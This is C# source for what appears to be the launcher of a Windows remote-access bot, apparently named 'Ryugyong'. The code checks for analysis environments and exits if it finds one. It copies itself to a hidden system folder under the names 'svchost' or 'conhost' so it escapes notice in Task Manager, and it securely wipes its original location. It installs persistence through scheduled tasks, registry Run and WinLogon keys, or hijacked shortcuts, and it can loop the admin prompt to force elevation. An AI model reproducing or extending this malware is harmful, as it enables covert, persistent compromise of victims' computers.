using Main.Source.Functions;
using Main.Source.Utilities;
using System.ComponentModel;
using System.Diagnostics;

namespace Main.Source
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (ProtectionCheck())
            {
                Environment.Exit(0);
                return;
            }

            MutexCheck();

            if (args.Length == 0)
            {
                Init();
            }
            else if (args.Length == 1 && args[0] == ConfigMisc.LAUNCH_KEY)
            {
                Start().Wait();
            }
            else if (args.Length == 2 && args[0] == ConfigMisc.LAUNCH_KEY)
            {
                string oldDir = args[1];

                if (Directory.Exists(oldDir))
                {
                    string[] files = Directory.GetFiles(
                        oldDir,
                        "*",
                        SearchOption.AllDirectories
                    );

                    foreach (string file in files)
                    {
                        Files.SecureDelete(file);
                    }

                    Logger.Info($"Main: secure deleted files in old dir \"{oldDir}\"");

                    try
                    {
                        Directory.Delete(oldDir, true);
                    }
                    catch
                    {
                        Logger.Warn($"Main: failed to delete old dir \"{oldDir}\" itself");
                    }
                }

                Start().Wait();
            }

            Environment.Exit(0);
        }

        private static void Init()
        {
            AdminCheck();

            string newDir = string.Empty;
            string newName = string.Empty;

            if (ConfigSetup.USE_NEW_DIR && ConfigSetup.NEW_DIR.Length > 0)
            {
                newDir = Crypto.Decrypt(ConfigSetup.NEW_DIR)
                    .Replace("<USERPROFILE>", Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
                    .Replace("<USER>", Environment.UserName)
                    .Replace("\\\\", "\\");
            }
            else
            {
                newDir = Common.IsElevated()
                    ? Environment.GetFolderPath(Environment.SpecialFolder.Windows)
                    : Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            }

            if (ConfigSetup.USE_NEW_NAME && ConfigSetup.NEW_NAME.Length > 0)
            {
                newName = Crypto.Decrypt(ConfigSetup.NEW_NAME);
            }
            else
            {
                // On Windows 10, when the process is named "svchost",
                // task manager will make the name blank and push
                // it to the top. (conhost isnt tested LOL)

                newName = Utilities.Windows.GetWindowsVersion() == Utilities.Windows.WindowsVersion.Windows11
                    ? "svchost"
                    : "conhost";
            }

            string newExecDir = Path.Join(newDir, newName);

            if (Directory.Exists(newExecDir))
            {
                _ = new DirectoryInfo(newExecDir)
                {
                    Attributes = FileAttributes.Normal
                };

                // If it fails to delete "newExecDir", the whole
                // process will kill itself.
                // We do not wrap it in a try catch cuz failing
                // means its in use and Ryugyong is probably
                // running and we dont want to kill it in a
                // production scenario and never be able to
                // recover it. (provided USE_MUTEX is disabled)

                Directory.Delete(newExecDir, true);
                Logger.Info($"Init: deleted already existing new dir \"{newExecDir}\"");
            }

            Directory.CreateDirectory(newExecDir).Attributes =
                FileAttributes.Hidden |
                FileAttributes.System |
                FileAttributes.ReadOnly;

            string? oldExecDir = Path.GetDirectoryName(Environment.ProcessPath);

            Files.CopyFiles(oldExecDir, newExecDir);

            Logger.Info($"Init: copied {Files.CountFiles(oldExecDir)} files from \"{oldExecDir}\" to \"{newExecDir}\"");

            string[] foundFiles = Directory.GetFiles(
                newExecDir,
                Path.GetFileName(Environment.ProcessPath),
                SearchOption.TopDirectoryOnly
            );

            if (foundFiles.Length == 0)
            {
                Logger.Error("Init: failed to find main exe");

                Environment.Exit(0);
                return;
            }

            string newExecItself = foundFiles.First();

            Persist(newName, newExecItself);

            var procInfo = new ProcessStartInfo
            {
                FileName = newExecItself,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
            };

            procInfo.ArgumentList.Clear();
            procInfo.ArgumentList.Add(ConfigMisc.LAUNCH_KEY);
            procInfo.ArgumentList.Add(oldExecDir);

            Process.Start(procInfo);

            Logger.Info("Init: finished");
            Environment.Exit(0);
        }

        private static async Task Start()
        {
            Logger.Info("Start: starting up");

            await Bot.Manager.StartAsync();
        }

        private static void Persist(string name, string path)
        {
            if (Common.IsElevated() && ConfigOptions.ADMIN_CUSTOM_PERSISTENCE)
            {
                switch (ConfigOptions.PERSISTENCE_METHOD)
                {
                    case PersistMethod.TaskScheduler:
                        Functions.Persistence.TaskScheduler.Install(name, path);
                        return;

                    case PersistMethod.WinLogonRegKey:
                        Functions.Persistence.WinLogon.Install(path);
                        return;
                }
            }

            switch (ConfigOptions.PERSISTENCE_METHOD)
            {
                case PersistMethod.AutoRunRegKey:
                    Functions.Persistence.AutoRun.Install(name, path);
                    return;

                case PersistMethod.ImpersonateLNK:
                    Functions.Persistence.ImpersonateLNKs.Install(path);
                    return;

                case PersistMethod.StartFolder:
                    
                    return;
            }
        }

        private static void AdminCheck()
        {
            if (!ConfigOptions.REQUIRE_ADMIN || Common.IsElevated())
            {
                return;
            }

            if (ConfigOptions.FORCE_ADMIN)
            {
                while (true)
                {
                    try
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = Environment.ProcessPath,
                            UseShellExecute = true,
                            CreateNoWindow = true,
                            WindowStyle = ProcessWindowStyle.Hidden,
                            Verb = "runas"
                        });

                        Environment.Exit(0);
                    }
                    catch { }
                }
            }

            if (ConfigOptions.PROMPT_ADMIN)
            {
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = Environment.ProcessPath,
                        UseShellExecute = true,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Verb = "runas"
                    });

                    Environment.Exit(0);
                }
                catch (Win32Exception ex)
                {
                    if (!ConfigOptions.CONTINUE_WITHOUT_ADMIN)
                    {
                        Environment.Exit(0);
                        return;
                    }

                    if (ex.NativeErrorCode != 1223)
                    {
                        Logger.Warn($"AdminCheck: unexpected error code \"{ex.NativeErrorCode}\" when prompt admin and continue");
                    }
                }
            }
        }

        private static void MutexCheck()
        {
            if (!ConfigOptions.USE_MUTEX || ConfigOptions.MUTEX_NAME.Length == 0)
            {
                return;
            }

            bool canContinue = false;

            using var mutex = new Mutex(
                true,
                "Global\\" + Crypto.Decrypt(ConfigOptions.MUTEX_NAME),
                out canContinue
            );

            if (!canContinue)
            {
                Environment.Exit(0);
                return;
            }
        }

        private static bool ProtectionCheck()
        {
            return Protection.CheckUsername() ||
                Protection.CheckDesktopFileNames();
        }
    }
}
